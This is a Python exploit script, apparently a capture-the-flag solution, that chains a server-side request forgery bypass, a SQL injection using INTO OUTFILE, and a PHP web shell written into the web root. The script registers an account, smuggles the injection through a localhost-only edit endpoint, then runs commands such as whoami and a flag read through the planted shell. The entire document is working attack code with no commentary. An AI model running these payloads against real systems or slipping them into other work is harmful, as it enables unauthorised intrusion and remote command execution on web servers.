import requests
import time
import sys
import secrets

class Exploit:
    def __init__(self, baseURL):
        self.baseURL = baseURL.rstrip("/")
        self.session = requests.Session()
        self.endpoint_register = "/register.php"
        self.endpoint_login = "/login.php"
        self.communication = "/communicate.php"
        self.username = f"atk_{secrets.token_hex(4)}"
        self.password = "attacer"
        self.shell_name = f"shell_{secrets.token_hex(4)}.php"
        self.ssrf_url = "0://127.0.0.1:80;motherland.com:80/"

    def register(self):
        print("[*] Registering attacker account...")
        data = {
            "name": "attacker",
            "username": self.username,
            "password": self.password,
            "planet": "earth",
        }
        response = self.session.post(self.baseURL + self.endpoint_register, data=data, timeout=10)
        if response.status_code == 200 and "Username already taken" not in response.text:
            print("[+] Registration successful.")
        else:
            print("[-] Registration failed.")
            print(response.text[:300])
            sys.exit(1)

    def login(self):
        data = {
            "username": self.username,
            "password": self.password,
        }
        response = self.session.post(self.baseURL + self.endpoint_login, data=data, timeout=10)
        session_id = self.session.cookies.get("PHPSESSID")
        if response.status_code == 200 and session_id and "Invalid credentials" not in response.text:
            print("[+] Login successful.")
            print("[+] Logged in, PHPSESSID =", session_id)
        else:
            print("[-] Login failed.")
            sys.exit(1)

    def communicate(self):
        payload = (
            "x' UNION SELECT "
            "'<?php system($_GET[\"cmd\"]); ?>',"
            "2,3,4,5 "
            f"INTO OUTFILE '/var/www/html/{self.shell_name}'-- -"
        )
        try:
            response = self.session.post(
                f"{self.baseURL}{self.communication}",
                data={
                    "url": self.ssrf_url,
                    "data[action]": "edit",
                    "data[new_name]": payload,
                },
                timeout=5,
            )
            if "Only localhost can use this function" in response.text:
                print("[-] SSRF failed: edit endpoint still saw a non-local request.")
                sys.exit(1)
        except requests.exceptions.ReadTimeout:
            pass
        print("[+] Name changed to SQLi payload")

    def trigger_sqli(self):
        print("[*] Triggering SQLi payload...")
        try:
            self.session.get(f"{self.baseURL}/", timeout=5)
        except requests.exceptions.ReadTimeout:
            pass
        print("[+] SQLi trigger request sent")

    def verify_shell(self):
        shell_url = f"{self.baseURL}/{self.shell_name}"
        print(f"[*] Verifying shell at {shell_url}...")
        try:
            response = self.session.get(shell_url, params={"cmd": "whoami"}, timeout=5)
            if response.status_code == 200:
                print("[+] Shell successfully created!")
                print(f"[+] Access it at: {shell_url}?cmd=whoami")
            else:
                print("[-] Shell not found.")
        except requests.exceptions.ReadTimeout:
            print("[-] Shell verification timed out.")

    def get_flag(self):
        shell_url = f"{self.baseURL}/{self.shell_name}"
        print(f"[*] Attempting to retrieve flag using shell at {shell_url}...")
        try:
            response = self.session.get(shell_url, params={"cmd": "cat /*_flag.txt"}, timeout=5)
            if response.status_code == 200:
                print("[+] Flag retrieved successfully!")
                print(f"[+] Flag: {response.text.strip()}")
            else:
                print("[-] Failed to retrieve flag.")
        except requests.exceptions.ReadTimeout:
            print("[-] Flag retrieval timed out.")

if __name__ == "__main__":
    BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://154.57.164.78:32695/"
    exploit = Exploit(BASE_URL)
    exploit.register()
    exploit.login()
    exploit.communicate()
    exploit.trigger_sqli()
    time.sleep(2)
    exploit.verify_shell()
    exploit.get_flag()
